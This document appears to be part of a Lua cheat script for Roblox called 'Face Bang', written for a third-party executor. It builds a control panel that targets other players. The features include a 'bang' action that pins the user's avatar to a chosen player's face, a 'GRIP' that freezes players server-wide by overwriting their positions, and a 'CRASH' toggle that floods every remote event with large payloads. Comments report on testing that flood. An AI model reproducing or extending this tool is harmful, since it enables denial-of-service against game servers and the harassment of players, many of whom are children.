		Size = UDim2.fromScale(1, 1),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		CanvasSize = UDim2.new(),
		AutomaticCanvasSize = Enum.AutomaticSize.Y,
		ScrollBarThickness = 3,
		ScrollBarImageColor3 = Theme.accent,
	}, playerList)
	new("UIListLayout", { Padding = UDim.new(0, 3), SortOrder = Enum.SortOrder.LayoutOrder }, plScroll)
	new("UIPadding", {
		PaddingTop = UDim.new(0, 5), PaddingLeft = UDim.new(0, 5),
		PaddingRight = UDim.new(0, 5), PaddingBottom = UDim.new(0, 5),
	}, plScroll)

	local selected = nil
	local function markPlayers()
		for _, row in ipairs(pool) do
			if row.Parent then
				local isSel = selected ~= nil and row.Name == selected.Name
				row.BackgroundColor3 = isSel and Theme.accent or Theme.surface
				row.TextColor3 = isSel and Color3.new(1, 1, 1) or Theme.text
			end
		end
		if selected then
			selectedLabel.Text = "target: " .. selected.Name
		else
			selectedLabel.Text = "select a player below"
		end
	end

	local function refreshPlayers()
		for _, row in ipairs(pool) do row:Destroy() end
		table.clear(pool)
		for i, plr in ipairs(Players:GetPlayers()) do
			if plr ~= LP then
				local row = new("TextButton", {
					Size = UDim2.new(1, 0, 0, 28),
					BackgroundColor3 = Theme.surface,
					Text = plr.Name,
					TextColor3 = Theme.text,
					Font = Font,
					TextSize = 12,
					TextXAlignment = Enum.TextXAlignment.Left,
					AutoButtonColor = false,
					BorderSizePixel = 0,
					Name = plr.Name,
					LayoutOrder = i,
				}, plScroll)
				corner(row, 8)
				stroke(row, Theme.hair, 1, 0.55)
				new("UIPadding", { PaddingLeft = UDim.new(0, 10) }, row)
				row.MouseEnter:Connect(function()
					if not (selected == plr) then
						tweenObj(row, "BackgroundColor3", Theme.surfaceHi)
					end
				end)
				row.MouseLeave:Connect(function()
					if not (selected == plr) then
						tweenObj(row, "BackgroundColor3", Theme.surface)
					end
				end)
				row.MouseButton1Click:Connect(function()
					selected = plr
					Engine.target = plr
					markPlayers()
					out("selected " .. plr.Name)
				end)
				pool[#pool + 1] = row
			end
		end
		markPlayers()
	end

	local function pick() return selected end

	action(plPage, 2, "bang selected", function()
		local p = pick()
		if p then Engine.start(p) else out("no player selected") end
	end)

	action(plPage, 3, "teleport to selected", function()
		local p = pick() if p then Targets.teleportTo(p) end
	end)

	-- No fling rows any more. Flinging needs characters to collide, which is off
	-- in the games this is used in, and a weld fling visibly pins the target to
	-- you for its duration - the exact "he looks frozen" symptom. The module API
	-- still has Targets.fling / flingWeld for anyone who wants them explicitly.
	section(plPage, 4, "view")

	action(plPage, 5, "freeze selected (local view, expires)", function()
		local p = pick() if p then Targets.freeze(p) end
	end)

	action(plPage, 6, "thaw selected", function()
		local p = pick() if p then Targets.thaw(p) end
	end)

	action(plPage, 7, "follow selected", function()
		local p = pick() if p then Targets.follow(p) end
	end)

	action(plPage, 8, "spectate selected", function()
		local p = pick() if p then Targets.spectate(p) end
	end)

	action(plPage, 9, "freeze all in view (local, max 12)", function()
		local ok, n = Targets.freezeAll(80, 12)
		if ok then out("froze " .. tostring(n) .. " in view") else out("no character") end
	end)

	--[[
	  GRIP rows write their root, so unlike the freeze above this actually holds
	  them for the whole server. Same module the Server tab uses; kept here too
	  because this is where you are already looking at the player list.
	]]
	section(plPage, 11, "grip - server-wide freeze")

	action(plPage, 12, "GRIP selected (real freeze)", function()
		local p = pick()
		if not p then out("no player selected") return end
		local ok, err = Grip.hold(p)
		out(ok and ("gripped " .. p.Name) or tostring(err))
	end)

	action(plPage, 13, "release selected grip", function()
		local p = pick()
		if not p then out("no player selected") return end
		Grip.release(p)
		out("released " .. p.Name)
	end)

	action(plPage, 14, "stop all player actions", function()
		Targets.cleanup()
		Grip.stop()
		out("player actions cleared")
	end)

	---------------------------------------------------------------- Server tab
	local svPage = pages.Server
	local svo = 0
	local function svOrder() svo += 1 return svo end

	--[[
	  GRIP: the real freeze. It writes THEIR root, so it holds for the whole
	  server, not just your view (see grip.lua for the limits). The local-view
	  freeze on the Players tab is still there and is still the cheap option.
	]]
	section(svPage, svOrder(), "grip - freeze the server")

	stepper(svPage, svOrder(), "grip writes", { 1, 2, 3 }, function(v)
		Config.GripRate = v
		out("grip: 1 write every " .. v .. " frame(s)")
	end, 1)

	stepper(svPage, svOrder(), "grip radius", { 60, 150, 400, 1e9 }, function(v)
		Config.GripRadius = v
	end, 2)

	stepper(svPage, svOrder(), "grip cap", { 5, 15, 30, 60 }, function(v)
		Config.GripMaxPlayers = v
		out("grip cap: " .. v .. " players")
	end, 2)

	local gripAllToggle = toggle(svPage, svOrder(), "HARD FREEZE - hold everyone", function(on)
		if on then
			local ok, n, skipped = Grip.holdAll()
			out(string.format("gripped %d player(s)%s", n, skipped > 0 and (", " .. skipped .. " over cap") or ""))
			-- hold the switch on only if it actually caught somebody, so the row
			-- cannot claim an empty server is frozen
			if n == 0 then gripAllToggle.set(false) end
		else
			Grip.stop()
			out("grip released")
		end
	end, false)

	action(svPage, svOrder(), "grip nearest", function()
		local p = nearest()
		if not p then out("no player to grip") return end
		local ok, err = Grip.hold(p)
		out(ok and ("gripped " .. p.Name) or tostring(err))
	end)

	action(svPage, svOrder(), "grip all in radius", function()
		local ok, n, skipped = Grip.holdAll(Config.GripRadius)
		if ok then out(string.format("gripped %d in %d studs", n, Config.GripRadius)) end
		if skipped and skipped > 0 then out("cap reached, skipped " .. skipped) end
	end)

	action(svPage, svOrder(), "release all grips", function()
		Grip.stop()
		gripAllToggle.set(false)
		out("grip released")
	end)

	--[[
	  CRASH: flood every RemoteEvent in the game with large payloads.

	  This replaces the old part-spawning version, which was measured to do
	  NOTHING to the server: client-created instances do not replicate. Remote
	  fires are the only channel the server is forced to receive, and 620 of them
	  at 8 KB each were delivered inside 0.5s in testing.
	]]
	section(svPage, svOrder(), "crash - flood the server's remotes")

	local crashRate = 33
	stepper(svPage, svOrder(), "fires per frame", { 8, 33, 66, 133 }, function(v)
		crashRate = v
		out("crash rate: " .. v .. "/frame")
	end, 2)

	local crashPayload = 8
	stepper(svPage, svOrder(), "payload size", { "0 kb", "2 kb", "8 kb", "16 kb" }, function(v)
		crashPayload = tonumber((v:gsub(" kb$", ""))) or 8
		out("payload: " .. v)
	end, 3)

	local crashToggle = toggle(svPage, svOrder(), "CRASH (flood remotes)", function(on)
		if on then
			local ok, n = Crash.start(crashRate, crashPayload)
			if not ok then
				crashToggle.set(false)
				out(tostring(n))
				return
			end
			out("flooding " .. n .. " remote(s)")
		else
			Crash.stop()
			local st = Crash.status()
			out(string.format("stopped after %d fires (%d/s)", st.sent, st.perSec))
		end
	end, false)

	actionConfirm(svPage, svOrder(), "CRASH + GRIP (flood and freeze)", function()
		-- grip first: if the flood fails to start (no remotes), the grip at least
		-- still happened, so the row always does as much as it can
		local _, n = Grip.holdAll()
		local ok, res = Crash.start(crashRate, crashPayload)
		if not ok then
			out(string.format("gripped %d; flood failed: %s", n, tostring(res)))
			gripAllToggle.set(n > 0)
			return
		end
		crashToggle.set(true)
		gripAllToggle.set(n > 0)
		out(string.format("flooding %d remote(s) + %d gripped", res, n))
	end)

	action(svPage, svOrder(), "grip / crash status", function()
		local c = Crash.status()
		out(string.format("gripped %d · flood %s · %d fires (%d/s) · %d remotes",
			Grip.count(), c.running and "on" or "off", c.sent, c.perSec, c.remotes))
	end)

	actionConfirm(svPage, svOrder(), "stop crash + release grip", function()
		Crash.stop()
		Grip.stop()
		crashToggle.set(false)
		gripAllToggle.set(false)
		out("everything released")
	end)

	section(svPage, svOrder(), "scene")

	stepper(svPage, svOrder(), "time of day", { "off", "9", "12", "18", "0" }, function(v)
		if v == "off" then return end
		pcall(function()
			local Lighting = game:GetService("Lighting")
			Lighting.ClockTime = tonumber(v) or 12
		end)
	end, 1)

	toggle(svPage, svOrder(), "no fog", function(on)
		pcall(function()
			local Lighting = game:GetService("Lighting")
			Lighting.FogEnd = on and 1e6 or 1000
		end)
	end, false)

	action(svPage, svOrder(), "perf: fps / ping / parts", function()
		local p = SelfTools.perf()
		out(string.format("%d fps · %d ms · %d parts", p.fps, p.ping, p.parts))
	end)

	action(svPage, svOrder(), "copy job id", function()
		local id = game.JobId
		if CAP.clipboard then
			pcall(function() ENV.setclipboard(id) end)
			out("job id copied")
		else
			out("job id: " .. tostring(id))
		end
	end)

	action(svPage, svOrder(), "rejoin", function()
		local TS = game:GetService("TeleportService")
		pcall(function()
			if ENV.queue_on_teleport then
				ENV.queue_on_teleport([[repeat wait() until game:IsLoaded()]])
			end
			TS:Teleport(game.PlaceId, LP)
		end)
	end)

	action(svPage, svOrder(), "server hop", function()
		local TS = game:GetService("TeleportService")
		local http = (ENV.request or ENV.http_request or syn and syn.request)
		if not http then out("no http function") return end
		local ok, res = pcall(function()
			return http({
				Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100", game.PlaceId),
				Method = "GET",
			})
		end)
		if not ok or not res or not res.Body then out("hop lookup failed") return end
		local data = (ENV.HttpService and game:GetService("HttpService")) and game:GetService("HttpService"):JSONDecode(res.Body) or nil
		if not data or not data.data then out("no servers found") return end
		for _, srv in ipairs(data.data) do
			if srv.id ~= game.JobId and (srv.playing or 0) < (srv.maxPlayers or 0) then
				pcall(function() TS:TeleportToPlaceInstance(game.PlaceId, srv.id, LP) end)
				return
			end
		end
		out("no other server available")
	end)

	actionConfirm(svPage, svOrder(), "unload script", function()
		ENV.FaceBang.Unload()
	end)

	------------------------------------------------------------------- footer
	new("Frame", {
		Size = UDim2.new(1, -24, 0, 1),
		Position = UDim2.new(0, 12, 1, -20),
		BackgroundColor3 = Theme.hair,
		BackgroundTransparency = 0.4,
		BorderSizePixel = 0,
	}, win)

	local footer = new("TextLabel", {
		Size = UDim2.new(1, -24, 0, 12),
		Position = UDim2.new(0, 12, 1, -16),
		BackgroundTransparency = 1,
		Text = IsTouch
			and string.format("[%s] bang   [%s] loop   [%s] stop   [%s] hide - keys also work here",
				Config.KeyBang.Name, Config.KeyLoop.Name, Config.KeyStop.Name, Config.KeyUI.Name)
			or string.format("[%s] bang   [%s] loop   [%s] stop   [%s] hide",
				Config.KeyBang.Name, Config.KeyLoop.Name, Config.KeyStop.Name, Config.KeyUI.Name),
		TextXAlignment = Enum.TextXAlignment.Left,
		TextColor3 = Theme.faint,
		Font = Font,
		TextSize = 9,
	}, win)

	--------------------------------------------------------------- animation
	-- One RenderStepped loop drives every ambient animation. It never yields and
	-- does no allocation per frame: no closures in the body, no task.wait.
	local sheen = new("Frame", {
		Name = "FB_Sheen",
		Size = UDim2.new(0, 74, 0, 2),
		Position = UDim2.new(-0.3, 0, 0, HEADER_H - 2),
		BackgroundColor3 = Theme.accent,
		BackgroundTransparency = 0.4,
		BorderSizePixel = 0,
		ZIndex = 5,
	}, win)
	new("UIGradient", {
		Transparency = NumberSequence.new({
			NumberSequenceKeypoint.new(0, 1),
			NumberSequenceKeypoint.new(0.5, 0.15),
			NumberSequenceKeypoint.new(1, 1),
		}),
	}, sheen)

	-- open animation: the panel eases up from slightly small, so it lands rather
	-- than simply appearing
	local openScale = new("UIScale", { Name = "FB_OpenScale", Scale = 0.94 }, win)
	TweenService:Create(openScale, TweenInfo.new(0.24, Enum.EasingStyle.Quint),
		{ Scale = 1 }):Play()

	local t0 = os.clock()
	local lastT = os.clock()
	conns[#conns + 1] = RunService.RenderStepped:Connect(function()
		local now = os.clock() - t0
		local dt = os.clock() - lastT
		lastT = os.clock()
		if Bg then Bg.tick(dt) end
		if winGrad then winGrad.Offset = Vector2.new((now * 0.16) % 1, 0) end

		-- header sheen sweeping left to right, then a pause before it repeats
		local cycle = (now % 4.2) / 1.1
		if cycle <= 1 then
			sheen.Position = UDim2.new(-0.3 + cycle * 1.6, 0, 0, HEADER_H - 2)
			sheen.BackgroundTransparency = 0.35
		else
			sheen.BackgroundTransparency = 1
		end

		-- breathing halo behind the status dot
		if dotRing then
			dotRing.BackgroundTransparency = 0.86 - 0.12 * (0.5 + 0.5 * math.sin(now * 3.4))
		end

		-- the main button's glow pulses while it is the thing you are about to hit
		if bangGlow then
			bangGlow.BackgroundTransparency = 0.66 - 0.14 * (0.5 + 0.5 * math.sin(now * 2.6))
		end

		-- age out press ripples
		for i = #ripples, 1, -1 do
			local rec = ripples[i]
			local age = os.clock() - rec.t
			if age > 0.42 or not rec.frame.Parent then
				if rec.frame.Parent then pcall(function() rec.frame:Destroy() end) end
				table.remove(ripples, i)
			else
				local grow = 14 + age * 300
				rec.frame.Size = UDim2.fromOffset(grow, grow)
				rec.frame.Position = UDim2.new(0.5, -grow / 2, 0.5, -grow / 2)
				rec.frame.BackgroundTransparency = 0.55 + age * 1.1
			end
		end
	end)

	--------------------------------------------------------------------- api
	UI = {}
	UI.refresh = refreshPlayers

	function UI.status(text) status.Text = text end

	function UI.state(on)
		stateDot.BackgroundColor3 = on and Theme.good or Theme.dim
		dotRing.BackgroundColor3 = on and Theme.good or Theme.dim
		dotRing.BackgroundTransparency = on and 0.78 or 0.88
		if bangLabel and bangLabel.Parent then
			bangLabel.Text = on and "BANGING" or "BANG NEAREST"
		end
		if loopToggle then loopToggle.set(Engine.loop) end
	end

	function UI.markList() markPlayers() end

	------------------------------------------------------------------- wiring
	hideBtn.MouseButton1Click:Connect(function() win.Visible = not win.Visible end)

	local keyBinds = {
		[Config.KeyBang] = function() Engine.toggle() end,
		[Config.KeyLoop] = function()
			Engine.loop = not Engine.loop
			if Engine.loop and not Engine.running then Engine.start() end
			loopToggle.set(Engine.loop)
		end,
		[Config.KeyStop] = function() Engine.stop() end,
		[Config.KeyUI] = function() win.Visible = not win.Visible end,
	}
	-- Hotkeys are bound on every device. UserInputService.TouchEnabled is true on
	-- any laptop with a touchscreen and on Windows tablets with a keyboard, so the
	-- old `if not IsTouch` gate silently disabled B/L/X/RightShift for anyone who
	-- could also have used them. Touch users simply have no keyboard to press.
	conns[#conns + 1] = UserInput.InputBegan:Connect(function(input, processed)
		if processed or input.UserInputType ~= Enum.UserInputType.Keyboard then return end
		local fn = keyBinds[input.KeyCode]
		if fn then pcall(fn) end
	end)

	conns[#conns + 1] = Players.PlayerAdded:Connect(function(plr)
		plr.CharacterAdded:Connect(function() task.delay(0.5, refreshPlayers) end)
		refreshPlayers()
	end)
	conns[#conns + 1] = Players.PlayerRemoving:Connect(function(plr)
		if Engine.target == plr then Engine.target = nil end
		if selected == plr then selected = nil end
		-- drop any grip on a player who left: the record keeps a Player reference
		-- and would be walked forever against a character that no longer exists
		Grip.release(plr)
		task.defer(refreshPlayers)
	end)
	conns[#conns + 1] = LP.CharacterAdded:Connect(function()
		-- clears the saved CFrame too, so a later stop cannot teleport the new
		-- character back to where the old one stood
		Engine.reset()
		task.delay(0.6, function() SelfTools.onCharacterAdded() end)
		task.delay(1.5, function()
			if Engine.loop then Engine.start() end
		end)
	end)

	local function onViewportChanged()
		fitPanel()
	end
	if Workspace.CurrentCamera then
		conns[#conns + 1] = Workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(onViewportChanged)
	end

	task.spawn(function()
		while gui.Parent do
			task.wait(0.5)
			if Engine.running and not alive(Engine.target) then
				if Engine.loop and Config.AutoRetarget then
					local nxt = nearest()
					if nxt then Engine.start(nxt) end
				elseif not Config.AutoRetarget then
					Engine.stop()
				end
			end
		end
	end)

	------------------------------------------------------------------ unload
	local function unload()
		Engine.running = false
		pcall(restore)
		-- Engine.destroy() is what actually stops the three frame passes. Without
		-- it a reload left RenderStepped/Heartbeat/PreSimulation ticking against a
		-- destroyed GUI, with getgenv().FaceBang already overwritten so the
		-- orphans were unreachable.
		pcall(function() Engine.destroy() end)
		pcall(function() Targets.cleanup() end)
		-- the grip and the crash load are the only two things here that outlive the
		-- panel if you reload without releasing them: the grip would keep writing
		-- CFrame into a destroyed UI's world and the FB_Load folder would sit in
		-- Workspace forever, which is exactly what made a reload feel laggier
		pcall(function() Grip.stop() end)
		pcall(function() Crash.stop() end)
		pcall(function() SelfTools.restoreAll() end)
		pcall(function() FX.destroy() end)
		pcall(function() SelfTools.stopPerf() end)
		for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
		table.clear(conns)
		if gui then gui:Destroy() end
		ENV.FaceBang = nil
		notify("Face Bang", "Unloaded")
	end

	ENV.FaceBang = {
		Engine = Engine,
		Config = Config,
		UI = UI,
		Targets = Targets,
		Self = SelfTools,
		Capabilities = CAP,
		Unload = unload,
		Bang = function(plr) return Engine.toggle(plr) end,
		Stop = function() Engine.stop() end,
		-- grip / crash are reachable from the console too: getgenv().FaceBang.Grip.hold(plr)
		Grip = Grip,
		Crash = Crash,
	}

	SelfTools.startPerf()
	showTab("Aim")
	refreshPlayers()
	UI.state(false)
	notify("Face Bang", string.format(
		"Loaded - %s | %s", CAP.executor, IsTouch and "touch mode" or "desktop mode"), 5)

end
